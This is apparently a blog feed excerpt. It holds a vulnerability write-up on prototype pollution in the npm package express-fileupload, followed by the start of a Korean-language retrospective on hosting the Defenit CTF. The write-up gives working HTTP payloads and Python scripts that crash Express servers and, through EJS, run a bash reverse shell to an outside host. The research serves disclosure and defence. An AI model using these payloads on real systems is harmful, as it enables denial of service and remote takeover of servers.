        <content type="html"><![CDATA[<h1 id="Real-world-JS-1"><a href="#Real-world-JS-1" class="headerlink" title="Real-world JS 1"></a>Real-world JS 1</h1><blockquote><p>Real-world JS Vulnerabilities Series 1</p></blockquote><h2 id="express-fileupload"><a href="#express-fileupload" class="headerlink" title="express-fileupload"></a>express-fileupload</h2><p>JavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition such as CTFs<br>But, there seems to be a lack of real-world research for them, so I started research to find it and share data.</p><p>This research aims to improve the nodejs ecosystem security level.</p><p><img src="/img/2020/07/image-20200729093633030.png" alt="image-20200729093633030"></p><p>This vulnerability is in the first case about the <code>express-fileupload</code>.<br>As shown in the name, this module provide file upload function as <code>express middleware</code></p><p><img src="/img/2020/07/image-20200729093731270.png" alt="image-20200729093731270"></p><p>Until today, this <code>express-fileupload</code> has been downloaded a total of <code>7,193,433</code> times.</p><p><img src="/img/2020/07/image-20200729094135815.png" alt="image-20200729094135815"></p><p>The <code>express-fileupload</code> module provides several options for uploading and managing files in the nodejs application.<br>Among them, the <code>parseNested</code> make argument flatten.</p><p>Therefore, if we provide <code>{&quot;a.b.c&quot;: true}</code> as an input,<br>Internally, It will used as <code>{&quot;a&quot;: {&quot;b&quot;: {&quot;c&quot;: true}}}</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">busboy.on(<span class="string">'finish'</span>, () =&gt; &#123;</span><br><span class="line">    debugLog(options, <span class="string">`Busboy finished parsing request.`</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.parseNested) &#123;</span><br><span class="line">        req.body = processNested(req.body);</span><br><span class="line">        req.files = processNested(req.files);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req[waitFlushProperty]) <span class="keyword">return</span> next();</span><br><span class="line">    <span class="built_in">Promise</span>.all(req[waitFlushProperty])</span><br><span class="line">        .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        next();</span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        debugLog(options, <span class="string">`Error while waiting files flush: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">        next(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>So, if <code>options.parseNested</code> has a value. If calls <code>processNested</code> Function, and argument will be <code>req.body</code> and <code>req.files</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">processNested</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || data.length &lt; <span class="number">1</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> d = &#123;&#125;,</span><br><span class="line">        keys = <span class="built_in">Object</span>.keys(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> key = keys[i],</span><br><span class="line">            value = data[key],</span><br><span class="line">            current = d,</span><br><span class="line">            keyParts = key</span><br><span class="line">        .replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/\[/g</span>), <span class="string">'.'</span>)</span><br><span class="line">        .replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/\]/g</span>), <span class="string">''</span>)</span><br><span class="line">        .split(<span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; keyParts.length; index++)&#123;</span><br><span class="line">            <span class="keyword">let</span> k = keyParts[index];</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= keyParts.length - <span class="number">1</span>)&#123;</span><br><span class="line">                current[k] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!current[k]) current[k] = !<span class="built_in">isNaN</span>(keyParts[index + <span class="number">1</span>]) ? [] : &#123;&#125;;</span><br><span class="line">                current = current[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The above is the full source of the <code>processNested</code> function.<br>Here provides <code>flatten</code> function for key, of <code>req.files</code>.</p><p>It split the key value of the first argument of object obtained through <code>Object.keys(data)</code> by <code>.</code><br>and makes loop using that, and refers/define object repeatedly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> some_obj = <span class="built_in">JSON</span>.parse(<span class="string">`&#123;"__proto__.polluted": true&#125;`</span>);</span><br><span class="line">processNested(some_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(polluted); <span class="comment">// true!</span></span><br></pre></td></tr></table></figure><p>In this function, prototype pollution vulnerability is caused by the above usage.<br>Therefore, if we can put manufactured objects in this function, it can affect the express web application.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">'express-fileupload'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileUpload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.end(<span class="string">'express-fileupload poc'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p>Therefore, configure and run the express server using <code>express-fileupload</code> in the above form.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">123</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"name"</span>; filename=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>And I send the above <code>POST</code> request.</p><p><img src="/img/2020/07/image-20200729100022061.png" alt="image-20200729100022061"></p><p>Then we can confirm that the some object is given as the argument of <code>processNested</code> function. (I added code for debug)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">137</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"__proto__.toString"</span>; filename=<span class="string">"filename"</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>Let’s try <code>prototype pollution</code><br>If we send this with the name changed to <code>__proto__.toString</code>.</p><p><img src="/img/2020/07/image-20200729100528922.png" alt="image-20200729100528922"></p><p>An object with the key <code>__proto__.toString</code> is created and call processNested function.<br>and pollute <code>toString</code> method of <code>Object.prototype</code>.<br>And from the moment this value is covered with a object that is not a function.<br>The <code>express</code> application makes error for every request !</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isRegExp = <span class="function"><span class="keyword">function</span> <span class="title">isRegExp</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">'[object RegExp]'</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the <code>qs</code> module used within the <code>express</code>, <code>location.search</code> part of the HTTP request will be parsed and make it to <code>req.query</code> object.<br>In that logic, <code>qs</code> uses <code>Object.prototype.toString</code>.<br>Therefore, this function called for every request in the express application (even if there is no search part)<br>If <code>Object.prototype.toString</code> can be polluted, this will cause an error.<br>and for every request, express always returns 500 error.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://p6.is:7777'</span>, files = &#123;<span class="string">'__proto__.toString'</span>: <span class="string">'express-fileupload poc'</span>&#125;);</span><br></pre></td></tr></table></figure><p>Actually, if we use script above to pollute the prototype of <code>server</code></p><p><img src="/img/2020/07/image-20200729101543292.png" alt="image-20200729101543292"></p><p>For all requests, the server returns either these error messages (development mode)<br>or only a blank screen and <code>500 Internal Server Error</code>! 😮</p><h2 id="How-to-get-shell"><a href="#How-to-get-shell" class="headerlink" title="How to get shell?"></a>How to get shell?</h2><p>We can already make a DOS, but everyone wants a shell.<br>So, I’ll describe one way to acquire shell through the vulnerability above.</p><p><img src="/img/2020/07/image-20200729102550071.png" alt="image-20200729102550071"></p><p>The simplest way to obtain shell through <code>prototype solution</code> in the express application is by using the <code>ejs</code>.<br>Yes, There is a limitation to whether the application should be using the <code>ejs template engine</code></p><p><img src="/img/2020/07/image-20200729102347702.png" alt="image-20200729102347702"></p><p>But the EJS is the most popular template engine for the nodejs<br>and also used very often in combination with the express.</p><p>If this vulnerability exists, you can bet on this. (no guaranteed 😏)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">'express-fileupload'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileUpload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.polluted);</span><br><span class="line">    res.render(<span class="string">'index.ejs'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7777</span>);</span><br></pre></td></tr></table></figure><p>The above is an example of using the ejs module.<br>There was only one line change in replacing the rendering engine.</p><p>Because the parseNested option is still active, we can still pollute prototype.<br>Unlike the above here, I will use <code>req.body</code> object.</p><p>Because we can manipulated the value of that as string.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------1566035451</span><br><span class="line">Content-Length: 137</span><br><span class="line"></span><br><span class="line">----------1566035451</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.polluted&quot;;</span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------1566035451--</span><br></pre></td></tr></table></figure><p>Similar with above, but the <code>filename</code>of <code>Content-Disposition</code> has been deleted.<br>Then the value will go to <code>req.body</code> not <code>req.files</code>.</p><p><img src="/img/2020/07/image-20200729103038537.png" alt="image-20200729103038537">)<img src="/img/2020/07/image-20200729103132948.png" alt="image-20200729103132948"></p><p>By checking the values that enter the <code>processNested</code> function<br>You can see that the values that were previously objects is now string.</p><p>pollution happens the same as before.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Template</span>(<span class="params">text, opts</span>) </span>&#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.templateText = text;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;string | null&#125;</span> </span>*/</span></span><br><span class="line">  ...</span><br><span class="line">  options.outputFunctionName = opts.outputFunctionName;</span><br><span class="line">  options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;</span><br><span class="line">  options.views = opts.views;</span><br><span class="line">  options.async = opts.async;</span><br></pre></td></tr></table></figure><p>The target value to pollute is the <code>outputFunctionName</code>, which is an option in the ejs rendering function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;string&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> src;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;ClientFunction&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> fn;</span><br><span class="line">  <span class="keyword">var</span> opts = <span class="keyword">this</span>.opts;</span><br><span class="line">  <span class="keyword">var</span> prepended = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">var</span> appended = <span class="string">''</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;EscapeCallback&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;FunctionConstructor&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">    <span class="keyword">this</span>.generateSource();</span><br><span class="line">    prepended +=</span><br><span class="line">      <span class="string">'  var __output = "";\n'</span> +</span><br><span class="line">      <span class="string">'  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n'</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">      prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) &#123;</span><br><span class="line">      <span class="keyword">var</span> destructuring = <span class="string">'  var __locals = ('</span> + opts.localsName + <span class="string">' || &#123;&#125;),\n'</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; opts.destructuredLocals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = opts.destructuredLocals[i];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          destructuring += <span class="string">',\n  '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        destructuring += name + <span class="string">' = __locals.'</span> + name;</span><br><span class="line">      &#125;</span><br><span class="line">      prepended += destructuring + <span class="string">';\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">      prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">      appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    appended += <span class="string">'  return __output;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>The ejs makes Function for implement their template and executing<br>and the <code>outputFunctionName</code> option used in the process is included in the function.</p><p>Therefore, if we can manipulate this value, any command can be executed.</p><p>This technique was introduced by a Chinese CTF in 2019.<br>Please refer to <a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">here</a> for details.</p><p>That part has not been patched so far, and it is expected to remain in the future.<br>So we can take advantage of it.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1566035451</span></span><br><span class="line">Content-Length: <span class="number">221</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-1566035451</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"__proto__.outputFunctionName"</span>;</span><br><span class="line"></span><br><span class="line">x;process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1"'</span>);x</span><br><span class="line">---------<span class="number">-1566035451</span>--</span><br></pre></td></tr></table></figure><p>So first, we’re going to pollute the <code>Object.prototype.outputFunctionName</code> using the <code>prototype pollution</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: p6.is:7777</span><br></pre></td></tr></table></figure><p>and calls template function of ejs.</p><p><img src="/img/2020/07/image-20200729104502663.png" alt="image-20200729104502663"></p><p>Then we can get the shell !<br>If all the process can be represented by python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">'http://p6.is:7777'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f"x;console.log(1);process.mainModule.require('child_process').exec('<span class="subst">&#123;cmd&#125;</span>');x"</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">'http://p6.is:7777'</span>)</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/richardgirges/express-fileupload/issues/236" target="_blank" rel="noopener">https://github.com/richardgirges/express-fileupload/issues/236</a></li><li><a href="https://www.npmjs.com/package/express-fileupload" target="_blank" rel="noopener">https://www.npmjs.com/package/express-fileupload</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Review of 2020 Defenit CTF</title>
      <link href="/Review-of-2020-Defenit-CTF/"/>
      <url>/Review-of-2020-Defenit-CTF/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1060" target="_blank" rel="noopener">https://ctftime.org/event/1060</a></li></ul><img src="/img/iu.jpeg" style="display:none"><p><img src="/img/2020/06/defenit_ctf4.png" alt="defenit_ctf4"></p><blockquote><p>Defenit에서 2020년 6월 5일 18시부터, 7일 18시까지 처음으로 CTF를 호스팅 하였습니다.<br>이번 대회는 사실 처음부터 예정에 있던 것이 아니었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf5.png" alt="defenit_ctf5"></p><blockquote><p>대회 운영금을 어떻게 구해야 할까 고민해 보았지만, 마땅한 답이 나오지 않았습니다.<br>사비를 내어 통해 최소한의 사이즈로 진행하려던 것이 처음 계획이었지만,<br>많은 분들의 후원 덕분에 높은 수준으로 진행될 수 있었습니다. 감사합니다.</p></blockquote><h2 id="Website-Development"><a href="#Website-Development" class="headerlink" title="Website Development"></a>Website Development</h2><blockquote><p>문제 출제에 앞서서 생각보다 준비해야 할 것들이 많았는데, 가장 신경썼던 것중의 하나는 플랫폼을 제작하는 것이었습니다.<br><code>CTFd</code>나 <code>mellivora</code> 도 분명 훌륭한 플랫폼이지만, 장기적으로 보면 자체적인 플랫폼을 개발하여 운영하는 쪽이 나을 것이라고 판단했습니다.</p></blockquote><blockquote><p>개발은 제가 프론트엔드, 03sunf 님이 백엔드를 담당하여 작업하였는데<br>총 작업 기간으로 잡은 것은 두달이었지만<br>개인적인 사정으로 앞의 한달정도는 거의 하지 못했고<br>남은 한달의 기간동안 개발을 진행하게 되었습니다.<br>웹 사이트가 방문자들에게 주는 첫인상에 많은 영향을 끼칠 것이라는 생각에<br>양산형 CTF에서 느껴질 수 있는 저렴한 느낌을 최대한 배제하기 위해 신경 썼습니다.<br>결과적으로 레트로 스타일의 테마와, 무려 모바일과 PC 모두를 지원하고, 예쁜 스코어보드를 가진(!) 플랫폼이 완성되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf3.png" alt="defenit_ctf3"></p><h2 id="Registering-Event"><a href="#Registering-Event" class="headerlink" title="Registering Event"></a>Registering Event</h2><blockquote><p>아무래도 CTF를 개최하게 되면, 일반적인 팀으로서는 홍보할 곳이 마땅치 않습니다.<br>때문에 홍보를 CTFTime에 의존할 수 밖에 없는데<br>CTFTime에 이벤트 등록 시 필수적으로 들어가는 정보는<br>여기에 CTF명, 디스크립션, 로고, URL 입니다.</p></blockquote><blockquote><p>해당 정보는 등록된 후에도 수정이 가능한데<br>등록 신청을 하고 승인되기까지 이틀 정도가 소요되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf6.png" alt="defenit_ctf6"></p><h2 id="Registering-CTF"><a href="#Registering-CTF" class="headerlink" title="Registering CTF"></a>Registering CTF</h2><blockquote><p>승인이 되고 나면, 이제는 이번에 개최할 이벤트의 상세 정보를 등록해야 합니다.<br>여러가지 정보와 더불어 ctftime 엔드포인트를 등록하는 란이 있어서<br><code>/api/ctftime</code> 주소에 만들어서 등록했는데, 사실 별로 쓸모는 없었던 것 같습니다.<br>CTF 등록신청을 하고 승인까지는 다시 이틀 정도가 소요되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf4.png" alt="defenit_ctf4"></p><h2 id="Weight"><a href="#Weight" class="headerlink" title="Weight"></a>Weight</h2><blockquote><p>CTFTime 에서는 처음으로 진행되는 이벤트의 경우에는, 아무리 고득점을 받아도 Weight는 25점이 최대입니다.<br>19년도의 Hitcon의 레이팅이 92점이라는 것을 생각해보면, 아직 앞으로 갈 길이 먼것 같습니다.</p></blockquote><h2 id="Making-Challenges"><a href="#Making-Challenges" class="headerlink" title="Making Challenges"></a>Making Challenges</h2><blockquote><p>문제 출제는 상당히 매끄럽지 못했습니다<br>참가자 분들에게서 많은 칭찬을 받기도 했지만<br>사실은 교차 검증도 부족했고, 시간에 쫒겨가며 문제를 만들었습니다.</p><p>아무래도 출제자가 많다 보니 관리하는게 극도로 힘들었습니다.<br>와중에 플랫폼도 만들고 제 문제도 출제하면서<br>회사일에 주변에 부가적인 업무도 어쩐지 계속 생기는 터라<br>약간 어지러울 정도였는데, @Jsec이 많이 신경써줘서 이만큼 나왔던 것 같습니다.</p></blockquote><blockquote><p>분야별 문제 개수 배분도 좋지 못했습니다.<br>Rev, Pwn 은 괜찮은 수준이었지만<br>Misc + Osint 문제 수가 일반적인 CTF 와 비교하면 과도한 탓에<br>노력해 보았지만, 끝내 지적을 받고 말았습니다.</p></blockquote><blockquote><p>개인적으로도 CTF 플랫폼에 너무 힘을 줬기 때문에, 출제에 별로 힘을 쓰지 못했습니다.<br>3문제를 실제로 출제한 기간은 2주 정도였고, 덕분에 많은 언인텐 풀이가 있었습니다.</p></blockquote><blockquote><p>웹 문제는 총 5개였고, 그 중 4개를 출제했는데 사실 여기에는 비하인드 스토리(…)가 존재합니다.<br>대회 +24h 까지만 해도 웹 문제는 4개였는데, babyjs 를 출제하고 나서<br>터무니없이 간단하게 언인텐이 발생하였기 때문에</p></blockquote><blockquote><p>대회가 22시간 남은 시점부터 새로운 문제를 만들게 되었고<br>다행스럽게도 +32h 릴리즈 타임에 출제가 가능했습니다.<br>네, 이게 <code>Adult JS</code> 입니다.</p></blockquote><blockquote><p>이전에 교차 검증을 철저히 했으면 이런일이 없었을 테지만, 다들 시간에 쫒기는 탓에<br>제대로 점검하지 못했습니다. 이것은 고쳐야 할 점이겠지요.<br>내년에는 준비기간을 2배 이상 늘릴 생각입니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf8.png" alt="defenit_ctf8"></p><h2 id="Scoring"><a href="#Scoring" class="headerlink" title="Scoring"></a>Scoring</h2><blockquote><p>36c3의 스코어링 방식을 채택했고 만족스럽게 동작했습니다.<br>survey 문제에 한정해서 스태틱 방식의 스코어링이 이루어졌으면<br>더 좋았을 거라고 생각되어 내년 적용을 생각하고 있습니다.</p></blockquote><h2 id="Period"><a href="#Period" class="headerlink" title="Period"></a>Period</h2><blockquote><p>48시간 대회를 기획했고 KST(+9) 기준으로<br>금요일 오후 6시부터 일요일 오후 6시까지 진행했습니다<br>그러나 대회 시작 시간과, 기간 모두 적절하지 못했다고 생각합니다.</p></blockquote><blockquote><p>저희에게 금요일 오후 6시였지만 일부 유럽에서는<br>그 시작 시간이 목요일 아침이었기에, 참여가 굉장히 어려웠으리라 뒤늦게 알게 되었습니다.<br>내년에는 다른 타임존까지 고려해서, 온전히 주말에만 진행될 수 있도록 할 생각입니다.</p></blockquote><blockquote><p>시간도 아마 36h쪽이 더 적절했을 것이라고 